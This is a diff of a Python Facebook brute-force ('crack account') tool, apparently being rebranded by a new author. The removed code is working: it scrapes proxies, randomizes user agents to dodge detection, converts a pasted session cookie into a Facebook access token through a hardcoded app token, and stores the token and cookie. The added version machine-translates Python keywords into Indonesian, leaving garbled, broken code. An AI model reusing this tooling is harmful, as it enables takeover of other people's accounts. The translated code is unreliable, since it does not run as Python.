@@ -1,165 +1,168 @@
-#-----------------[ IMPORT-MODULE ]-------------------
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as parser
-from bs4 import BeautifulSoup as par
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as panel
-from rich.panel import Panel as nel
-from rich.progress import track
-from time import sleep
-from rich import print as cetak
-from concurrent.futures import ThreadPoolExecutor as XyzonXD
-from rich.panel import Panel
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich.tree import Tree
+#-----------------[MODUL-IMPOR]-------------------
+permintaan impor, bs4, json, os, sys, acak, datetime, time, re
+impor urllib3, kaya, base64
+from rich.table import Table seperti saya
+dari rich.console impor Konsol sebagai sol
+dari bs4 impor BeautifulSoup sebagai sop
+from bs4 impor BeautifulSoup sebagai parser
+from bs4 impor BeautifulSoup sebagai par
+from concurrent.futures mengimpor ThreadPoolExecutor sebagai tred
+dari rich.console import Group sebagai gp
+dari rich.panel impor Panel sebagai panel
+dari rich.panel impor Panel sebagai nel
+dari trek impor rich.progress
+dari waktu mengimpor tidur
+dari cetak impor kaya seperti cetak
+dari concurrent.futures mengimpor ThreadPoolExecutor sebagai BrayennnXD
+dari panel impor rich.panel
+dari rich.markdown impor Penurunan harga sebagai mark
+dari rich.columns mengimpor Kolom sebagai kolom
+dari rich.tree mengimpor Pohon
 from rich import print as rprint
-from rich import print as prints
-from rich import pretty
-from rich.console import Console as sol
-from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
-from rich.text import Text as tekz
-dump = []
+dari cetak impor kaya sebagai cetakan
+dari import kaya cantik
+dari rich.console impor Konsol sebagai sol
+dari rich.progress mengimpor Progress,SpinnerColumn,BarColumn,TextColumn
+dari rich.text impor Teks sebagai tekz
+membuang = []
 memek = []
 ualu,ualuh = [],[]
-try:
-        import rich
-except ImportError:
-        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
-        os.system('pip install rich')
-try:
-        import stdiomask
-except ImportError:
+mencoba:
+        impor kaya
+kecuali ImportError:
+        cetak(nel('\t• Sedang Menginstall Modul Kaya •'))
+        os.system('pip instal kaya')
+mencoba:
+        impor stdiomask
+kecuali ImportError:
         cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
         os.system('pip install stdiomask')
-try:
-	import requests
-except ImportError:
-	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
-	os.system('pip install requests && pip install mechanize ')
-###----------[ IMPORT MODULE RICH ]---------- ###
-from rich.panel import Panel
-from rich.tree import Tree
-from rich import print as prints
-from rich.console import Console
-from rich.table import Table
-from rich.columns import Columns
-from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
-console = Console()
-sys.stdout.write('\x1b]2;SMBF | SIMPLE MULTI BRUTE FACEBOOK\x07')
-#------------------[ USER-AGENT ]-------------------#
-pretty.install()
+mencoba:
+	permintaan impor
+kecuali ImportError:
+	cetak(nel('\t• Permintaan Modul Sedang Menginstall •'))
+	os.system('pip install request && pip install mechanize')
+###---------[ IMPOR MODUL KAYA ]---------- ###
+dari panel impor rich.panel
+dari rich.tree mengimpor Pohon
+dari cetak impor kaya sebagai cetakan
+dari konsol impor rich.console
+dari tabel impor rich.table
+dari rich.columns mengimpor Kolom
+dari rich.progress impor Kemajuan, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
+konsol = konsol()
+sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')
+#------------------[ AGEN PENGGUNA ]-------------------#
+cantik.install()
 CON=sol()
 ugen2=[]
 ugen=[]
-cokbrut=[]
+kokbrut=[]
+dia=[]
 lisensikuni,lisensiku=[],[]
-ses=requests.Session()
-princp=[]
-from rich.console import Console
-from rich.columns import Columns
-wa = Console()
-try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
-	open('.prox.txt','w').write(prox)
-except Exception as e:
+ses=permintaan.Sesi()
+prinsip=[]
+dari konsol impor rich.console
+dari rich.columns mengimpor Kolom
+wa = Konsol()
+mencoba:
+	prox= request.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
+	buka('.prox.txt','w').tulis(prox)
+kecuali Pengecualian sebagai e:
 	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD')
-prox=open('.prox.txt','r').read().splitlines()
-for xd in range(10000):
-	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	c=random.randrange(73,100)
-	d=random.randrange(4200,4900)
-	e=random.randrange(40,150)
-	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+prox=buka('.prox.txt','r').baca().splitlines()
+untuk xd dalam rentang (10000):
+	a=random.pilihan(['3','4','5','6','7','8','9','10','11','12','13' ])
+	b=random.pilihan(['3','4','5','6','7','8','9','10','11','12','13' ])
+	c=random.rangkaian(73.100)
+	d=acak.rangkaian(4200,4900)
+	e=acak.rangkaian(40.150)
+	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/ 537,36'
 	ugen2.append(uaku)
 
-#------------[ UBAH UA DIH SINI OM ]---------------#
-for t in range(10000):
-	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
-	b=random.randrange(111111,210000)
-	c=random.randrange(73,100)
-	d=random.randrange(4200,4900)
-	e=random.randrange(40,150)
-	brayen1=f'Mozilla/5.0 (Linux; Android {a}; SM-G531H Build/RKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
-	brayen2=f'Mozilla/5.0 (Linux; Android {a}; SM-J610G Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
-	brayen3=f'Mozilla/5.0 (Linux; Android {a}; SM-A405FN Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
-	brayen4=f'Mozilla/5.0 (Linux; Android {a}; SM-X11O Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
-	uaku2 = random.choice([brayen1,brayen2,brayen3,brayen4])
+#-----------[UBAH UA DIH SINI OM]---------------#
+untuk t dalam rentang (10000):
+	a=random.pilihan(['3','4','5','6','7','8','9','10','11','12'])
+	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
+	c=acak.rangkaian(111111,210000)
+	d=random.rangkaian(11,19)
+	e=random.rangkaian(73.100)
+	f=acak.rangkaian(4200,4900)
+	g=acak.rangkaian(40.150)
+	random1=random.pilihan(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN',' SM-A405FN'])
+	random2=random.pilihan(['SM-J415N','SM-R765T','SM-A730F','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
+	brayen1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/{ e}.0.{f}.{g} Safari Seluler/537.36'
+	brayen2=f'Mozilla/5.0 (Linux; Android {a}; {random2} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/{ e}.0.{f}.{g} Safari Seluler/537.36'
+	uaku2 = random.pilihan([brayen1,brayen2])
 	ugen.append(uaku2)
-
-for x in range(10):
-	a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-	b=random.randrange(100, 9999)
-	c=random.randrange(100, 9999)
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	h=random.randrange(1, 9)
+		
+untuk x dalam rentang (10):
+	a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/'
+	b=random.rangkaian(100, 9999)
+	c=random.rangkaian(100, 9999)
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K' , 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', ' X', 'Y', 'Z'])
+	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K' , 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', ' X', 'Y', 'Z'])
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K' , 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', ' X', 'Y', 'Z'])
+	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K' , 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', ' X', 'Y', 'Z'])
+	h=random.rangkaian(1, 9)
 	i='Linux; Android 7.1.2; Redmi 4A)'
-	j=random.randrange(1, 9)
-	k=random.randrange(1, 9)
-	l='Mobile Safari/E7FBAF'
+	j=random.rangkaian(1, 9)
+	k=random.rangkaian(1, 9)
+	l='Safari Seluler/E7FBAF'
 	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
 def uaku():
-	try:
-		ua=open('bbnew.txt','r').read().splitlines()
-		for ub in ua:
+	mencoba:
+		ua=buka('bbnew.txt','r').baca().splitlines()
+		untuk ub di ua:
 			ugen.append(ub)
-	except:
-		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
-		ua=open('.bbnew.txt','w')
+	kecuali:
+		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').teks
+		ua=buka('.bbnew.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
-		for un in aa:
-			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
-###----------[ WARNA PRINT RICH ]---------- ###
-M2 = "[#FF0000]" # MERAH
-H2 = "[#00FF00]" # HIJAU
-K2 = "[#FFFF00]" # KUNING
-B2 = "[#00C8FF]" # BIRU
-P2 = "[#FFFFFF]" # PUTIH
-###----------[ CEK WARNA TEMA ]---------- ###
-try:
+		untuk un di aa:
+			ua.tulis(hapus+'\n')
+		ua=buka('.bbnew.txt','r').baca().splitlines()
+###---------[ WARNA CETAK KAYA ]---------- ###
+M2 = "[#FF0000]" #MERAH
+H2 = "[#00FF00]" #HIJAU
+K2 = "[#FFFF00]" #KUNING
+B2 = "[#00C8FF]" #BIRU
+P2 = "[#FFFFFF]" #PUTIH
+###---------[ CEK WARNA TEMA ]---------- ###
+mencoba:
 	file_color = open("data/theme_color","r").read()
 	color_text = file_color.split("|")[0]
 	color_panel = file_color.split("|")[1]
-except:
+kecuali:
 	color_text = "[#00C8FF]"
 	color_panel = "#00C8FF"
-#------------[ INDICATION ]---------------#
-id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
-taplikasi=['no']
-cokbrut=[]
-method = []
+#-----------[INDIKASI]---------------#
+id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[ ]
+aplikasi=['tidak']
+kokbrut=[]
+metode = []
 pwpluss,pwnya=[],[]
 P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' # MERAH
+M = '\x1b[1;91m' #MERAH
 H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
+K = '\x1b[1;93m' #KUNING
 B = '\x1b[1;94m' # BIRU
 U = '\x1b[1;95m' # UNGU
 O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'	# WARNA MATI
-#------------[ WARNA-COLOR ]--------------#
+N = '\x1b[0m' # WARNA MATI
+#-----------[WARNA-WARNA]--------------#
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
 H = '\x1b[1;92m'
 K = '\x1b[1;93m'
 B = '\x1b[1;94m'
-U = '\x1b[1;95m' 
+U = '\x1b[1;95m'
 O = '\x1b[1;96m'
 N = '\x1b[0m'    
 Z = "\033[1;30m"
-sir = '\033[41m\x1b[1;97m'
+pak = '\033[41m\x1b[1;97m'
 x = '\33[m' # DEFAULT
-m = '\x1b[1;91m' #RED +
+m = '\x1b[1;91m' #MERAH +
 k = '\033[93m' # KUNING +
 h = '\x1b[1;92m' # HIJAU +
 hh = '\033[32m' # HIJAU -
@@ -167,322 +170,363 @@ u = '\033[95m' # UNGU
 kk = '\033[33m' # KUNING -
 b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
-asu = random.choice([m,k,h,u,b])
-#--------------------[ CONVERTER-BULAN ]--------------#
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
+asu = random.pilihan([m,k,h,u,b])
+#-----------------------[ CONVERTER-BULAN ]--------------#
+dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni' ,'7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
+dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni' ,'07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Devember'}
 tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-#------------------[ MACHINE-SUPPORT ]---------------#
+bpk = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+#-----------------[DUKUNGAN MESIN]---------------#
 def alvino_xy(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-def clear():
-	os.system('clear')
-def back():
-	login()
-#------------------[ LOGO-LAKNAT ]-----------------#
-def banner():
-	cetak(panel(f"""
-           ___ ___ ___ __  __ ___ _   _ __  __
-          | _ \ _ \ __|  \/  |_ _| | | |  \/  |
-          |  _/   / _|| |\/| || || |_| | |\/| |
-          |_| |_|_\___|_|  |_|___|\___/|_|  |_|
-             """,width=90,title=f"LOGO",style=f"bold white"))
-#--------------------[ BAGIAN-MASUK ]--------------#
-def login123():
-	os.system('clear')
-	banner()
-	cetak(panel(f"[01] Login Menggunakan Cookie [[bold green] ON [bold white]]\n[02] Doa Sebelum Crack [[bold green] ON [bold white]]\n[03] Cara Mengambil Cookies Facebook [[bold green] ON [bold white]]\n[04] Cek Hasil Crack [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold white"))
+        untuk e di u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
+pasti jelas():
+	os.system('hapus')
+def kembali():
+	Gabung()
+#-----------------[ LOGO-LAKNAT ]-----------------#
+def spanduk():
+	cetak(panel(f"""[tebal hijau] ___ ____ ____ _ _ ____ _ _ _ _ _ _
+[hijau tebal] |__] |__/ |__| \_/ |___ |\ | |\ | |\ |
+[hijau tebal] |__] | \ | | | |___ | \| | \| | \|                                                                                                        
+             """,width=90,padding=(0,8),title=f"Banner",style=f"bold white"))
+#-----------------------[BAGIAN-MASUK ]--------------#
+pasti login123():
+	os.system('hapus')
+	spanduk()
+	cetak(panel(f"[[bold cyan]01[bold white]] Login Menggunakan Cookie [[bold green] ON [bold white]] [[bold cyan]03[bold white]] Menu Bot Pada Script [[bold green ] ON [bold white]]\n[[bold cyan]02[bold white]] Menu Crack Tanpa Login [[bold green] ON [bold white]] [[bold cyan]04[bold white]] Cek Hasil Crack [ [hijau tebal] ON [putih tebal]]",width=90,title=f"[bold green]Menu Bot",padding=(0,2),style=f"bold white"))
 	bryn = input(f' [+] Pilih Menu : ')
-	if bryn in ['1','01']:
+	jika bryn di ['1','01']:
 		login_lagi334()
-	elif bryn in ['2','02']:
-		doa_halal()
-	elif bryn in ['3','03']:
-		cetak(panel(f"Anda Akan Di Arahkan Ke Youtube Dan Liat Lah Dengan Mata Kepala Anda Sendiri Bagaimana Mengambil Cookies Yang Benar Dan Ikut Tutorial Nya",width=90,title=f"[bold green]Cookies Facebook",padding=(0,3),style=f"bold white"))
-		os.system("xdg-open https://youtu.be/iPs-ShFVOJA")
-		time.sleep(3)
-		exit()
-	elif bryn in ['4','04']:
-		result()
-	else:
-		print(' [+] Pilih Yang Bener Asu ')
-		time.sleep(5)
-		back()
+	elif bryn di ['2','02']:
+		lainnya()
+	elif bryn di ['3','03']:
+		bot()
+	elif bryn di ['4','04']:
+		hasil()
+	kalau tidak:
+		print(' [+] Pilih Yang Bener Asu')
+		waktu.tidur(5)
+		kembali()
 		
-def login():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
+pasti login():
+	mencoba:
+		token = buka('.token.txt','r').baca()
+		cok = buka('.cok.txt','r').baca()
 		tokenku.append(token)
-		try:
-			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
-			sy2 = json.loads(sy.text)['name']
+		mencoba:
+			sy = request.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+			sy2 = json.loads(sy.text)['nama']
 			sy3 = json.loads(sy.text)['id']
 			menu(sy2,sy3)
-		except KeyError:
-			login123()
-		except requests.exceptions.ConnectionError:
-			li = ' [+] Problem Internet Connection, Check And Try Again'
-			lo = mark(li, style='red')
+		kecuali KeyError:
+			masuk123()
+		kecuali permintaan.pengecualian.ConnectionError:
+			li = ' [+] Masalah Koneksi Internet, Periksa Dan Coba Lagi'
+			lo = mark(li, style='merah')
 			sol().print(lo, style='cyan')
-			exit()
-	except IOError:
-		login123()
+			KELUAR()
+	kecuali kesalahan IOE:
+		masuk123()
 		
 def login_lagi334():
-	try:
+	mencoba:
 		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
-		your_cookies = input(' [+] Cookie Facebook : ')
-		with requests.Session() as r:
-			try:
+		your_cookies = input(' [+] Masukan Cookie : ')
+		dengan request.Session() sebagai r:
+			mencoba:
 				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
-				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
-				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
-				code, user_code = response['code'], response['user_code']
-				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
-				r.headers.pop('content-type')
-				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
-				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
-				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
-				else:
-					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
+				data = {'akses_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','cakupan': ''}
+				respon = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
+				kode, kode_pengguna = respons['kode'], respons['kode_pengguna']
+				verifikasi_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status? method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
+				r.headers.pop('tipe-konten')
+				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/ html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' ,'sec-fetch-dest': 'dokumen',})
+				response2 = r.get(url_verifikasi, cookie = {'cookie': cookie_Anda}).text
+				jika 'Bagaimana Anda ingin masuk ke Facebook?' di str(response2) atau '/login/?next=' di str(response2):
+					print(" [+] Cookie Tidak Valid...", end='\r');time.sleep(3.5);print(" ", end='\r');exit()
+				kalau tidak:
+					tindakan = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
 					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
 					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
 					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
-					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
+					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec- ambil-situs': 'asal-sama',})
 					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
-					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
-						r.headers.pop('content-type');r.headers.pop('origin')
-						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
-						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
+					jika 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' di str(response3.url):
+						r.headers.pop('jenis konten');r.headers.pop('asal')
+						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).teks
+						tindakan = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
 						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
 						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
-						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
-						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
+						ruang lingkup = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
+						tampilan = re.search('name="display" value="(.*?)"', str(response4)).grup(1)
 						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
 						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
 						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
-						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
+						encrypt_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
 						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
-						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
-						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
+						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',} )
+						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body ,'return_format[]': return_format,}
 						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
 						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
-						r.headers.pop('content-type');r.headers.pop('origin')
+						r.headers.pop('jenis konten');r.headers.pop('asal')
 						r.headers.update({'referer': 'https://m.facebook.com/',})
-						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
-						if 'Sukses!' in str(response6):
-							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
-							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
+						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).teks
+						jika 'Sukses!' di str(respons6):
+							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com', 'accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
+							response7 = r.get(status_url, cookie = {'cookie': your_cookies}).teks
 							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
 							print(f"\n [+] Token : {access_token}")
-							tokenew = open(".token.txt","w").write(access_token)
+							tokennew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("\ [+] Login Berhasil | python run.py");exit()
-			except Exception as e:
-				print(" [+] Cookies Tidak Dapat Di Akses")
+							print("\n [+] Login Berhasil | python BrayennnFB.py");exit()
+			kecuali Pengecualian sebagai e:
+				print(" [+] Cookies Mokad Kontol")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
-				print(e)
-				time.sleep(3)
-				back()
-	except:pass
-	        
-#------------------[ BAGIAN-MENU ]----------------#
-def menu(my_name,my_id):
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
+				cetak(e)
+				waktu.tidur(3)
+				kembali()
+	kecuali: lulus
+
+#-----------------[BAGIAN-MENU]----------------#
+menu def(nama_saya,id_saya):
+	mencoba:
+		token = buka('.token.txt','r').baca()
+		cok = buka('.cok.txt','r').baca()
+	kecuali kesalahan IOE:
 		print(' [+] Cookies Kadaluarsa ')
-		time.sleep(5)
-		login()
-	os.system('clear')
-	banner()
-	ip = requests.get("https://api.ipify.org").text
+		waktu.tidur(5)
+		Gabung()
+	os.system('hapus')
+	spanduk()
+	ip = request.get("https://api.ipify.org").text
 	pengguna = request.get('https://api.countapi.xyz/hit/Brayen/visits').json()["nilai"]	
-	cetak(panel(f'[bold white] Terima Kasih Kepada [bold green]XyzonXD[bold white] Yang Telah Recode Script Ini, Simple Multi Brute Facebook',width=90,style=f"bold white"))
-	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/][bold white]\n[bold white][+[/][bold white]][/] [bold white]User Sc : [bold green]{pengguna}\n[[bold green]•[/][bold white]][/] [bold white]Status   : [bold green]Premium ',width=90,title=f"[bold green]Infomasi",style=f"bold white"))
